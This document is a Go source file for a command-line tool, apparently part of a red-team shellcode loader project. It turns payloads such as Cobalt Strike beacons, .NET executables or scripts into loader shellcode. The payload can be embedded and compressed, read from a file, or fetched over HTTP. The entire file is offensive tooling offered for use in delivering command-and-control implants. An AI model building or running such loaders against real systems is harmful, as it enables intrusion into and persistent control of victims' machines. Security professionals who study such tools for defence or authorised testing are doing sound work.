package main

import (
	"bytes"
	"debug/pe"
	"flag"
	"fmt"
	"os"
	"path/filepath"

	"github.com/RSSU-Shellcode/GRT-Develop/option"
	"github.com/RSSU-Shellcode/GRT-MXLoader/loader"
)

const (
	typeCSBeacon   = "cs"
	typeDotnet     = ".net"
	typeCommand    = "cmd"
	typePowershell = "ps"
	typeVBScript   = "vbs"
)

var (
	tplDir  string
	typ     string
	mode    string
	arch    int
	pldPath string

	compress  bool
	comWindow int
	httpOpts  loader.HTTPOptions
	options   loader.Options
	stage     bool

	outPath string
)

func init() {
	flag.StringVar(&tplDir, "dir", "template", "set shellcode templates directory")
	flag.StringVar(&typ, "t", "", "select the loader type: cs, .net, cmd, ps, vbs")
	flag.StringVar(&mode, "m", "", "select the payload load mode: embed, file, http")
	flag.IntVar(&arch, "a", 0, "set shellcode template architecture")
	flag.StringVar(&pldPath, "p", "", "set the input payload file path")
	flag.BoolVar(&compress, "compress", true, "compress payload when use embed mode")
	flag.IntVar(&comWindow, "window", 4096, "set the window size when use compression")
	flag.DurationVar(&httpOpts.ConnectTimeout, "timeout", 0, "set the timeout when use http mode")
	flag.StringVar(&options.ImageName, "im", "", "set the image name about command line for .NET")
	flag.StringVar(&options.CommandLine, "cmd", "", "set the command line for .NET exe")
	flag.BoolVar(&options.WaitMain, "wait", false, "wait for .NET exe to exit")
	flag.BoolVar(&options.AllowSkipDLL, "skip-dll", false, "allow skip DLL if failed to load for .NET")
	flag.BoolVar(&stage, "stage", false, "provide manually extracted stage from Cobalt-Strike beacon")
	flag.StringVar(&outPath, "o", "output.bin", "set output shellcode file path")
	option.Flag(&options.Runtime)
	flag.Parse()
}

func main() {
	if pldPath == "" {
		flag.Usage()
		return
	}

	var (
		ldrX64 []byte
		ldrX86 []byte
		err    error
	)
	switch typ {
	case typeCSBeacon:
		fmt.Println("load Cobalt-Strike beacon loader templates")
		ldrX64, err = os.ReadFile(filepath.Join(tplDir, "CSBeacon_x64.bin")) // #nosec
		checkError(err)
		ldrX86, err = os.ReadFile(filepath.Join(tplDir, "CSBeacon_x86.bin")) // #nosec
		checkError(err)
	case typeDotnet:
	case typeCommand:
	case typePowershell:
	case typeVBScript:
	default:
		flag.Usage()
		return
	}

	// create payload
	var payload loader.Payload
	switch mode {
	case "embed":
		fmt.Println("use embed payload mode")
		data, err := os.ReadFile(pldPath) // #nosec
		checkError(err)
		if typ == typeCSBeacon && !stage {
			data, err = loader.ExtractBeaconStage(data)
			checkError(err)
		}
		if typ == typeCSBeacon || typ == typeDotnet {
			fmt.Println("check PE image file")
			peFile, err := pe.NewFile(bytes.NewReader(data))
			checkError(err)
			switch peFile.Machine {
			case pe.IMAGE_FILE_MACHINE_AMD64:
				arch = 64
				fmt.Println("image architecture: x64")
			case pe.IMAGE_FILE_MACHINE_I386:
				arch = 32
				fmt.Println("image architecture: x86")
			default:
				fmt.Println("unknown pe image architecture type")
				return
			}
		}
		if compress {
			fmt.Println("enable payload compression")
			s := (len(data) / (2 * 1024 * 1024)) + 1
			fmt.Printf("please wait for about %d seconds for compress\n", s)
			payload = loader.NewEmbedCompress(data, comWindow)
		} else {
			payload = loader.NewEmbed(data)
		}
	case "file":
		fmt.Println("use local file mode")
		payload = loader.NewFile(pldPath)
	case "http":
		fmt.Println("use http mode")
		payload = loader.NewHTTP(pldPath, &httpOpts)
	default:
		fmt.Println("unknown load mode")
		return
	}

	// select shellcode template
	var template []byte
	switch arch {
	case 32:
		template = ldrX86
		fmt.Println("select template for x86")
	case 64:
		template = ldrX64
		fmt.Println("select template for x64")
	default:
		fmt.Println("unknown template architecture")
		return
	}

	fmt.Println("create loader shellcode instance from template")
	inst, err := loader.CreateInstance(template, arch, payload, &options)
	checkError(err)

	outPath, err = filepath.Abs(outPath)
	checkError(err)
	fmt.Println("save shellcode instance to:", outPath)
	err = os.WriteFile(outPath, inst, 0600)
	checkError(err)

	fmt.Println("generate shellcode successfully")
}

func checkError(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
